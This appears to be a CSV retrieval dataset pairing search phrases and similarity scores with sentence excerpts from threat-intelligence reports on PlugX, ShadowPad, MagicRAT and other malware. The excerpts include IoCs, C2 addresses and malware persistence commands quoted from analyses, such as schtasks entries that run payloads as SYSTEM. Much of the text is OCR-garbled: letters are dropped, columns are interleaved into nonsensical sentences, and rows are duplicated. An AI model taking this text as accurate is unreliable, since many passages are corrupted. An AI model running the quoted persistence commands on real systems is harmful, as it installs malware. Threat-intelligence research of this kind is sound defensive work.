hash,phrase,similarity,adjacent_sentences
583b051f7d0af3a232690a3ab12163b5,download,0.7841188173904248,"['For any inquiries about this service, visit the ESET Threat Inteligence page.', 'IoCs SHA-1 Filename ESET detection name D 69AB6B906F8DCE03B43BEB7A07189A69DC507B coreclr.dl Win32/Agent.ADMW Korp Dec 10AE4784D0FBC9CD5FD85B150830AEA34A1DEN/A Win32/Korplug.TC (dum mem 69AB6B906F8DCE03B43BEB7A07189A69DC507B coreclr.dl Win32/Agent.ADMW Korp 4EBFC035179CD72D323F0AB357537C094A276E6D PowerDVD18.exe Win32/Delf.UTN Korp Dec FDB16B8BA724659BAB5B2E1385CFD476F10607 N/A Win32/Korplug.TB (dum mem Dec 7E059258CF963B95BDE479D1C374A4C30624986 N/A Win32/Korplug.TC (dum mem 792729769760ECAB37F2A32DE4E61E7828547 SHELSEL.ocx Win32/Agent.ADMW Korp F05E89D031D0515978A79D81685B62AF4E3F9 SymHp.exe Win32/Delf.UTN Korp AB01E09872A094DC79890171A1764DE8B4360 BomerangLib.dl Win32/Korplug.TH Korp CDB15B1ED97985D94F83AF0548390E02A49F7 PotPlayer.dl Win32/Agent.ADYO Korp 908F5D21C2E14D4F65A7A38E26593A0D9A70 SmadHok32.dl Win32/Agent.ADMW Korp 47A1CE31353E8C26A8F4E02C1D378295B302C9E N/A Win32/Agent.ADMW Korp 528C2CDB5926EC970B216943C9D453F5E92 SmadHok32c.dl Win32/Agent.ADMW Korp CBD875E456C84F9E87EC392750D69A75FB6B23A SHELSEL.ocx Win32/Agent.ADMW Korp 2CF4BAFE062D38FAF472A7D1067B8039C2CE82 Adobe_Caps.dl Win32/Agent.ADMW Korp 97C92AD7145CF9386ABD527A8BCD6FABF9A148DocConvDl.dl Win32/Agent.ADYO Korp Dec 39863CECA1B0F54F5C063B3015B76CDB05971F3 N/A Win32/Korplug.TD (dum mem Vuln legit 0D5348B5C9A6C743615E819AEF152FB5B0DAB97 FontEDL.exe clean File exec Vuln legit Micr C8F582549315EAF4B5046F79AC953E71AD1C0 Silverlight.Configuration.execlean Silve Con Utilit Vuln legit D4FE4A4F2BD2C19F2613980C1839087E39CD PowerDVDLP.exe clean Pow exec Vuln legit 65898ACA030DCEFDA7C970D3A31E8EA7FC84ASymantec.exe clean Sym AntiV exec Vuln Adobe Stock Photos legit 7DB61872830F4A0E6BF96FAF6537D01F164FC clean CS3.exe Stoc exec 10/13 SHA-1 Filename ESET detection name D COVID-19 travel restrictions C13D0D69365DFAF9C472E615A61E058EBF596 EU reviews list of third Win32/Agent_AGen.NJ Dow countries.exe REGULATION OF THE EUROPEAN PARLIAMENT 062473912692F7A3FAB8485101D4FCF6D704ED23 Win32/TrojanDownloader.Agent.GDLDow AND OF THE COUNCIL.exe 2B5D6B51895DA4928D310C7C897F51A050 log.dl Win32/Agent.ACYW Korp 51DA645A7282FB84F18C398E67D761FD63 2.exe Win32/Agent.ADPL Korp 5902E1A58065D7248CD9D7D62C3F865813E6 log.dl Win32/Agent.ADXE Korp F67C53678B7857D1BC48040EA90E6C52946B3 KINGSTON.exe Win32/Agent.ADXZ Korp Vuln 58B6B5FD3F2BFD18262F547A932A4AFDF4E76 PotPlayer.exe clean legit exec Network Domain IP First sen Notes 103.56.53[.', ']120 20210615Korplug C&C 154.204.27[.', ']181 2020105Korplug C&C.', '43.254.218[.', ']42 20210209Download server.', '45.131.179[.', ']179 2020105Korplug C&C.', '176.13.69[.', ']91 2021-04-19Korplug C&C.', 'upespr[.']"
920bbf3f4cf30cf9c556531074485448,download,0.8178555471319602,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
da720a0b860cc8b213511d0e3c6beb1b,download,0.777563052410962,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
da720a0b860cc8b213511d0e3c6beb1b,download,0.777563052410962,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
5d9861a26c9cd5bdcb58921a7b6843d1,download,1.0,"['The RAT can not only aces and query Before atempting comunications to the databases but can also enumerate the networks to comand and control server, the malware checks which the infected computer is conected, set up for network conectivity.', ""It does this by using the network conections, modify the registry, lock the workstation'scren,controlprocesesandservices 34Polymorphicprograms canbemodified (ormodifythemselves) tohaveadiferentfilehash and/orsizewhileretainingthesame 3SQLinstructions areused toquerycertaintypesofdatabases functionality."", 'This facilitates code reuse by making signature and obtaininformationfromthem.', 'based detectionmoredificult.', 'PAGE6OF 24 COPYRIGHT COMANDFIVEPTY LTD.ALRIGHTSRESERVED.', 'legitimate Microsoft Windows domain by theatackersto disguisethem asbeingasociated download.windowsupdate.com.', 'This legitimate with NateOn an Instant Mesaging Service owned domain is hardcoded into the malware but may be by SK Comunications.', 'Legitimate files developed overiden by modifying the malwares by SK Comunicationsarealso knownby thename configuration.', ""nateon.exe'37."", 'Having determined there is network THEMALICIOUSINFRASTRUCTURE conectivity, the malware establishes Calback domains are translated to IP adreses comunications with the calback domain using the Domain Name System (DNS)38protocol.', ""nateon.duamlive.com'35on TCP port 80 (configured This translatesthedomaininto auniqueadreson as noted previously).""]"
5d9861a26c9cd5bdcb58921a7b6843d1,download,1.0,"['The RAT can not only aces and query Before atempting comunications to the databases but can also enumerate the networks to comand and control server, the malware checks which the infected computer is conected, set up for network conectivity.', ""It does this by using the network conections, modify the registry, lock the workstation'scren,controlprocesesandservices 34Polymorphicprograms canbemodified (ormodifythemselves) tohaveadiferentfilehash and/orsizewhileretainingthesame 3SQLinstructions areused toquerycertaintypesofdatabases functionality."", 'This facilitates code reuse by making signature and obtaininformationfromthem.', 'based detectionmoredificult.', 'PAGE6OF 24 COPYRIGHT COMANDFIVEPTY LTD.ALRIGHTSRESERVED.', 'legitimate Microsoft Windows domain by theatackersto disguisethem asbeingasociated download.windowsupdate.com.', 'This legitimate with NateOn an Instant Mesaging Service owned domain is hardcoded into the malware but may be by SK Comunications.', 'Legitimate files developed overiden by modifying the malwares by SK Comunicationsarealso knownby thename configuration.', ""nateon.exe'37."", 'Having determined there is network THEMALICIOUSINFRASTRUCTURE conectivity, the malware establishes Calback domains are translated to IP adreses comunications with the calback domain using the Domain Name System (DNS)38protocol.', ""nateon.duamlive.com'35on TCP port 80 (configured This translatesthedomaininto auniqueadreson as noted previously).""]"
c6e9167aeba80052f8215a05761dfcd8,download,0.8392022780406604,"['nifty-login .', 'com domain .', 'nifty-user .', 'com server .', 'universityexp .', 'com download .', 'yourturbe .', 'org services .', 'gogle-config .', 'com dunya .', '80 .']"
8b4f9d650778f96f05ba79da56898432,download,0.8526682551749308,"[']240.86.20:5651 Hosts: Mikael LC (administrator@mikael-company[.', ']ru) George Alan Developments Incorporated C:\\windows\\system32\\wbem\\wmic.exe proces where ExecutablePath=\'C:\\ProgramData\\lsas.exe\' delete C:\\windows\\system32\\wbem\\wmic.exe proces where ExecutablePath=\'C:\\ProgramData\\svchost.exe\' delete C:\\windows\\system32\\schtasks.exe /delete /tn ""Network Security Update"" /f C:\\windows\\system32\\schtasks.exe /create /sc onstart /tn ""Network Security Update"" /tr ""C:\\ProgramData\\lsas.exe"" /en SYSTEM %PROGRAMDATA%\\lsas.exe %PROGRAMDATA%\\svchost.exe %PROGRAMDATA%\\config.xml %PUBLIC%\\output.exe %APDATA%\\dnsoption.exe %APDATA%\\Microsoft\\Windows\\CDSyncReporting.exe Aditional information 3/4 It is recomended to change the so-caled atack surface (atack surface), including for filtering mesh ports for external information flows.', 'With the method of revealing the facts of tuneling information flows behind the aditional DNS protocol, perform rechecking and further monitoring of the log files for the presence of anomalous DNS backlogs.', 'Implement the posibility of centralized management of anti-virus protection on al non-powered computers; transfer the ability to live on computers (launching Yara-rules, acesing shkdlvh files, searching for indicators then), in the first line, in remote aces mode.', 'Graphic images Rice.', '1 Download fre download 4/4']"
6c9da1182b14cab92b846b684d492547,download,0.78638726452815,"['Fortunately, there are numerous companies that actively scan the uploaded libraries to identify posible malware.', 'When malicious packages are found, they often consist of information stealers (shocker).', 'Figure 45.', 'Malicious npm packages by Social Enginering technique 78 If these creds were doughnuts, the hot and fresh sign would stil be on.', '79 Bet you cant gues what coding environments the DBIR team uses :p 80 Same as this report: If you got this PDF or printed isue from a friend, please go to verizon.com/ dbir and download a copy for yourself.', 'Download early, download often!', '81 htps:/w.npmjs.com/about 82 Were afraid there are no cheat codes to get money.', 'Microtransactions for live-service games function the other way around.', '2024 DBIR Incident Clasification Paterns 45 Lastly, there were also packages that CIS targeted what we (and a few people smarter than we are) believe are Controls for dependency confusion atacks.', 'In these types of atacks, the atackers take consideration advantage of how some toling checks for packages on public repositories before it checks for private ones.', 'If the Mitigating against stolen atackers know that organizations are using the library super-col-internal- credentials library, which is stored in their internal repository, the atackers can create Acount Management [5] a library on a public repository caled Establish and Maintain an super-col-internal-library and the Inventory of Acounts [5.1] toling may check the public repo Disable Dormant Acounts [5.3] first before loking at the internal ones.']"
5f53a3a1339c0af277c7641aa04535e1,API hashing,0.8164911763814514,"['T105 Proces Injection ShadowPad is injected into a wmplayer.exe proces.', 'T140 Deobfuscate/Decode ShadowPad launcher uses XOR to decrypt Files or Information the payload.', 'ShadowPad uses a custom algorithm to decrypt strings and configuration.', 'T1027 Obfuscated Files or ShadowPad shelcode is XOR-encoded Information and uses fake conditional jumps to hinder disasembly.', 'ShadowPads strings and configuration are encrypted.', 'It also uses API hashing.', 'T143 Hiden Window ShadowPad is injected into a wmplayer.exe proces started in a hiden window.', 'Discovery T1010 Aplication Window ShadowPads keyloging module lists Discovery aplication windows.', 'T1083 File and Directory ShadowPads RecentFiles module lists Discovery files recently acesed.', '10/1 Tactic ID Name Description Comand T1071 Standard Aplication ShadowPad can use HTP and HTPS for and Layer Protocol C&C comunications.', 'Control T1043 Comonly Used ShadowPad uses TCP:43 and UDP:43.']"
0873b5a6a965dc8aefec6755d8537a99,retrieves the MachineGuid of the infected system from the SOFTWARE\Microsoft\Cryptography\MachineGuid registry key,0.7618253508146869,"['In fact, al comunication betwen the Trojan and C2 could be viewed using an ordinary trafic snifer.', 'Group-IB experts retrieved several JS comands that were executed on the infected device.', 'They were al designed to obtain information about an infected device.', 'They even included CMD comands (as described in the coresponding section).', ""Tols TinyFluf 6/17 As mentioned above, Group-IB experts detected two versions of TinyFluf: Campaign date SHA1 202-03-25 c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03-2 bd0a6a3628f268a37ac9d708d03f57fef5ed5e Campaign date;SHA1 202-03-25;c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03- 2;bd0a6a3628f268a37ac9d708d03f57fef5ed5e Let's begin with the tf.exe file (SHA1: c82e12e563d5d5f4a8d6703b5df7373b457abc) as the tol is much simpler than its predecesor."", 'Once launched, the aplication creates the directory %APDATA%\\%MachineGuid%, where %MachineGuid% is the registry value for HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.', 'If the directory already exists, the aplication terminates itself.', 'The aplication copies the interpreter Node.js (node.exe) and the malicious script s.txt to the created directory.', 'The script is heavily obfuscated, but if it can be run then there is no ned to waste time on de-obfuscation because the obfuscated layer restarts Node.js and pases a ""clean"" script to it as an argument.', ""How Group-IB Managed XDR's module caled Threat Hunting Framework Polygon displays the atack As sen in the screnshot, the argument of the second node.exe proces is a script without obfuscation."", 'Its functionality is simple: it conects to the adres 46.101.13[.']"
0873b5a6a965dc8aefec6755d8537a99,"retrieves the MachineGuid of the infected system from the ""SOFTWARE\Microsoft\Cryptography\MachineGuid"" registry key.",0.7618253508146869,"['In fact, al comunication betwen the Trojan and C2 could be viewed using an ordinary trafic snifer.', 'Group-IB experts retrieved several JS comands that were executed on the infected device.', 'They were al designed to obtain information about an infected device.', 'They even included CMD comands (as described in the coresponding section).', ""Tols TinyFluf 6/17 As mentioned above, Group-IB experts detected two versions of TinyFluf: Campaign date SHA1 202-03-25 c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03-2 bd0a6a3628f268a37ac9d708d03f57fef5ed5e Campaign date;SHA1 202-03-25;c82e12e563d5d5f4a8d6703b5df7373b457abc 202-03- 2;bd0a6a3628f268a37ac9d708d03f57fef5ed5e Let's begin with the tf.exe file (SHA1: c82e12e563d5d5f4a8d6703b5df7373b457abc) as the tol is much simpler than its predecesor."", 'Once launched, the aplication creates the directory %APDATA%\\%MachineGuid%, where %MachineGuid% is the registry value for HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.', 'If the directory already exists, the aplication terminates itself.', 'The aplication copies the interpreter Node.js (node.exe) and the malicious script s.txt to the created directory.', 'The script is heavily obfuscated, but if it can be run then there is no ned to waste time on de-obfuscation because the obfuscated layer restarts Node.js and pases a ""clean"" script to it as an argument.', ""How Group-IB Managed XDR's module caled Threat Hunting Framework Polygon displays the atack As sen in the screnshot, the argument of the second node.exe proces is a script without obfuscation."", 'Its functionality is simple: it conects to the adres 46.101.13[.']"
0034c03613ff5a7deb6db5caced7e65f,and hostname,0.7571705928794396,"['The data within the POST stub is stream constructed in a bufer with a header at ofset 0 (\\ Pragma: no-cache x30\\x30) folowed by the remote sever, remote Cache-Control: max-age=25920 port, XOR encrypted data and function cal Conection: Close location.', 'The function cal location is represented Content-Length: 1594 by the textual values shown in the table below and User-Agent: Mozila/4.0 is selected using a switch case statement as shown (compatible; MSIE 6.0;Windows NT in Figure 12.', 'It is used by the atacker to track the 5.1) cal path that resulted in the network beacon.', 'The Host: htp.jpaols[.', ']com\\x0d\\x0a\\ XOR encrypted data contains the MAC Adres, x0d\\x0a\\xcf\\xcf.', 'hostname and campaign code.', 'Numeric Representation Textual Representation 0 index.asp 1 index.php 2 index.jsp 3 index.cs 4 home.asp Figure 12: Cal path determined and embeded in network beacon 12 w.fireye.com FireEye: Operation Quantum Entanglement To elucidate the encryption scheme, let us go over a sample decryption proces.', 'The Figures 13 and 14 below shows data before and after a bitwise NOT operation.', 'Figure 13: Encrypted POST stub Figure 14: POST stub after bitwise NOT operation In the resulting data after NOT operation, the XOR key is \\x30\\x30\\x34\\x31.', 'When aplied to the hex data folowing it, we get the decrypted data below, which contains the MAC Adres, hostname, and campaign code.', 'The Python routine to perform this decryption is included in Apendix A Figure 15: Embeded XOR encrypted data in POST stub We observed plugin functionality in the implant.']"
c6e9167aeba80052f8215a05761dfcd8,the encrypted config.,0.7726071993536989,"['yaho-user .', 'com cmart .', 'iownyour .', 'org pofuyer .', '4pu .', 'com config .', 'microupdata .', 'com poly .', 'jwt .', 'ourhoby .', 'com copyright .']"
564c219dc0a2c3edd2eed08025387d9d,Enumerate files on desktop,0.7788114452623733,"['Nodachi: A previously unknown set of plugins uti- lized by SideCopy were caling Nodachi.', 'These Golang-based plugins have reconaisance and file-stealing abilities targeting an Indian multi-factor authentication ap known as Kavach.', 'RAT ANALYSIS CETARAT CetaRAT is a C#-based RAT family first sen in the wild since 2019.', 'Its malicious capabilities (Figure 8) include: Execution: Download and run arbitrary executables and comands.', 'Figure 8: CetaRAT comand codes.', 'File management: Upload, download, delete, rename and enumerate files.', 'Capture: Take screnshots and monitor clipboard data.', 'Proceses: List or kil proceses on the endpoint.', '2021 Cisco.', 'Al rights reserved.', 'talos-external@cisco.com | talosinteligence.com page 9 of 23 InSideCopy: How this APT continues to evolve its arsenal DETARAT DetaRAT is a previously unknown C#-based implant used by SideCopy.']"
08a0ccc49008dbbf532b22d39ac2b886,delete key files,0.8542855495673394,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
8b1ec3103590201632c0768238d50bea,the opening of a URL file extracted from the archive.,0.7605688236956025,"['Comparing comand lines in the covid-19 and Zeplin shortcuts The mechanism for initial infection is fundamentaly the same: trying to open either of the shortcuts leads to runing a comand that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder.', 'Further actions are performed with the help of an extracted JS script.', 'Figure 2.', 'Contents of script 34fDFkfSD32.js But here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\\Users\\Public\\Downloads, achieves persistence by ading itself to the startup folder and ading a scheduler task, and runs the payload.', 'The script also sends the output of ipconfig in a POST request to htp:/zeplin.atwebpages[.]com/inter.php.', 'The comand run by the shortcut also contains the opening of a URL file extracted from the archive.', 'The name of the URL file and the target adres depend on which shortcut is opened: 1/41 Conversations - iOS - Swipe Icons - Zeplin.url goes to: htps:/ap.zeplin.io/project/5b5741802f3131c3a63057a4/scren/5b589f697e4ce37e0e61df Tokbox icon - Ods and Ends - iOS - Zeplin.url goes to: htps:/ap.zeplin.io/project/5c161c03fde4d50a251e20a/scren/5cef98986801a41be3512b.', 'This is the only diference betwen the two LNK files.', 'In both cases, the target page is hosted on Zeplin, a legitimate service for colaboration betwen designers and developers, and requires loging in to view.', 'The payload consists of two files: svchast.exe It functions as a simple local shelcode loader.', 'The shelcode read from a fixed path.']"
8b1ec3103590201632c0768238d50bea,a GET request is sent to the C2 server.,0.8062952916547591,"['Four protocols are suported: 1.', 'Standard TCP conection Aplication-level mesages are sent unchanged as TCP segments.', '6/41 2.', 'Equivalent to HTP Long Poling The client creates two TCP conections.', 'The first wil be used to get packets from the server, and the second to send them.', 'During the first conection, a GET request is sent to the C2 server.', 'The server replies with headers with code 20 and Content- Length: 524280.', 'The subsequent stream of aplication-level mesages from the server to the client is sent as the body of an HTP response.', 'Figure 10.', 'First HTP conection with C2 After the corect response headers are received, the malware establishes a second conection to the same port, where a POST request is made.', 'The header dCy is generated by the client based on the UID and, it would sem, serves as the sesion ID that links the two conections.']"
cf257e6c27074e5b0154ddaa7a016f66,a GET request is sent to the C2 server.,0.7790628974339082,"['C2 comunication For C2 comunication, first, the trojan sends the victim\'s computer name, user name, a separator ""ZxZ"" and the Windows version puled from the registry.', 'The server responds back with data in the format <id><user>:""<Program name"">.', 'Next, the malware requests the program data.', 'The server sends back the data of the Portable Executable efectively matching the patern:<zero or more bytes>ZxZ<PE data minus the MZ>.', 'It then saves the file to %LOCALAPDATA%\\Debug\\<program name>.exe and tries to execute it.', 'Request sent to C2.', 'If the download is sucesful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response.', 'Based on our analysis, the opdoce DN-S means ""download sucesful"" and RN_E stands for run eror.', 'If failed, the malware atempts to download the program data 25 times, and after that, it wil launch itself and exit.', 'Conclusion htps:/blog.talosinteligence.com/202/05/biter-apt-ads-bangladesh-to-their.html 16/20 5/19/2, 12:15 PM Cisco Talos Inteligence Group - Comprehensive Threat Inteligence: Biter APT ads Bangladesh to their targets Organizations should be vigilant about the highly motivated threat actors who are known to conduct targeted atacks in their region.', 'Threat actors usualy emerge with smart techniques to acomplish their adversarial objectives and we have sen such an atempt in this campaign with the adition of a new variant to their arsenal.']"
fcef139433bae54ea996aa09f7e1fcf4,a GET request is sent to the C2 server.,0.7790628974339082,"['C2 comunication For C2 comunication, first, the trojan sends the victim\'s computer name, user name, a separator ""ZxZ"" and the Windows version puled from the registry.', 'The server responds back with data in the format <id> <user>:""<Program name"">.', 'Next, the malware requests the program data.', 'The server sends back the data of the Portable Executable efectively matching the patern:<zero or more bytes>ZxZ<PE data minus the MZ>.', 'It then saves the file to %LOCALAPDATA%\\Debug\\<program name>.exe and tries to execute it.', 'Request sent to C2.', 'If the download is sucesful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response.', 'Based on our analysis, the opdoce DN-S means ""download sucesful"" and RN_E stands for run eror.', 'If failed, the malware atempts to download the program data 25 times, and after that, it wil launch itself and exit.', 'Conclusion Organizations should be vigilant about the highly motivated threat actors who are known to conduct targeted atacks in their region.', 'Threat actors usualy emerge with smart techniques to acomplish their 15/19 adversarial objectives and we have sen such an atempt in this campaign with the adition of a new variant to their arsenal.']"
475cc557a403e5a686bf4e9a5b16e3d2,archive,1.0,"['Services display sensitive content.', 'for your neds.', 'such as Archive.org and Archive.Today aim to preserve al websites, which can Ad the folowing to a robots.txt I am NAME owner of DOMAIN.', 'be an unwelcome feature for those who file on your site.', 'Im oficialy requesting the imediate removal of my site wish to erase their past.', 'Fortunately we (Create a new file if one is not from al archive.org products.', 'stil have some privacy powers which already present.)', 'The User-agent: archive.org_ can be executed to remove undesired bot Disalow: / code present content asociated with the domains User-agent: archive.org_bot in our robots.txt file is not which we own.', 'being honored.', 'It can be sen Disalow: / at: Archive.org Removal Create a file caled verify.txt at the htps:/DOMAIN/robots.txt If your website(s) apear on Archive.', 'rot of your site.']"
475cc557a403e5a686bf4e9a5b16e3d2,archive,0.7882656392379622,"['DMCA Notice: with the folowing.', 'DMCA Notice: I am the site owner and sole User-agent: archive.org_bot copyright holder for each of I am the site owner and sole Disalow: / the domains cited above.', 'This copyright holder for each of leter is oficial notifica- the domains cited above.', 'This Modify your .htaces file to include tion under Section 512(c) of leter is oficial notifica- the Digital Milenium Copy- the folowing.', 'tion under Section 512(c) of right Act (DMCA), and I sek the Digital Milenium Copy- RewriteEngine On the removal of the aforemen- right Act (DMCA), and I sek tioned infringing material the removal of the aforemen- RewriteCond %{HTP_USER_AGENT} from your servers.', 'Archive.', 'tioned infringing material (archive.org_bot) [NC] org does not have any right from your servers.', 'Archive.', 'or permision to reproduce, RewriteRule .', '* - [R=403,L] Today does not have any right sel or display my websites in or permision to reproduce, any way, shape or form.', 'I am If using Cloudflare, ad the sel or display my websites in providing this notice in god folowing to a WAF rule.']"
6676698d65e372feb79c0159d9d2b11e,AES-128-CBC for encryption.,0.8346233093013999,[]
8b1ec3103590201632c0768238d50bea,use AES-128 in CFB mode as the encryption algorithm,0.9757967645429402,"['Figure 17.', 'Handling of PL shelcode in the loader body (ChaCha20) The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.', 'We can also find key information here in the structure of the PL shelcode: at ofset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key.', '9/41 Figure 18.', 'Handling of PL shelcode in the loader body (AES-128) Older loader versions use Cryptography API: Next Generation (BCrypt* functions) in an equivalent way.', 'They use AES-128 in CFB mode as the encryption algorithm.', 'The loaders that rely on external files have a similar code structure and one of two encryption types: ChaCha20 or AES-128-CBC.', 'The file should contain PL shelcode of the same format as in the self-contained loader.', 'The name depends on the specific sample and is encrypted with the algorithm used in it.', 'It can contain a ful file path (although we did not detect any such samples) or a relative path.', 'Figure 19.']"
d832c25b98e9a2dcd59fd5458f0993d3,a RAR archive,0.7618085146159383,"['Thursday, September 8, 202 By: Counter Threat Unit Research Team In June and July 202, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government oficials of several countries in Europe, the Midle East, and South America.', 'PlugX is modular malware that contacts a comand and control (C2) server for tasking and can download aditional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shelcode in executable file headers, and politicaly-themed decoy documents that align with regions where China has interests.', 'The malware is embeded within RAR archive files.', 'Opening the archive on a Windows computer with default setings displays a Windows shortcut (LNK) file (se Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hiden folder that contains the malware, embeded eight levels dep in a sequence of hiden folders named with special characters (se Figure 2).', 'This tiering is likely to bypas mail-scaning products that may not traverse the entire path when scaning content, sugesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', '1/1 Figure 2.', 'Malicious files contained within hiden folder.']"
d6fb4bd8b1c522bf7ea8a41470e1b45f,a RAR archive,0.7618085146159383,"['Thursday, September 8, 202 By: Counter Threat Unit Research Team In June and July 202, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government oficials of several countries in Europe, the Midle East, and South America.', 'PlugX is modular malware that contacts a comand and control (C2) server for tasking and can download aditional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shelcode in executable file headers, and politicaly-themed decoy documents that align with regions where China has interests.', 'The malware is embeded within RAR archive files.', 'Opening the archive on a Windows computer with default setings displays a Windows shortcut (LNK) file (se Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hiden folder that contains the malware, embeded eight levels dep in a sequence of hiden folders named with special characters (se Figure 2).', 'This tiering is likely to bypas mail-scaning products that may not traverse the entire path when scaning content, sugesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', 'htps:/w.secureworks.com/blog/bronze-president-targets-government-oficials 1/15 12/7/2, 9:27 AM BRONZE PRESIDENT Targets Government Oficials | Secureworks Figure 2.', 'Malicious files contained within hiden folder.']"
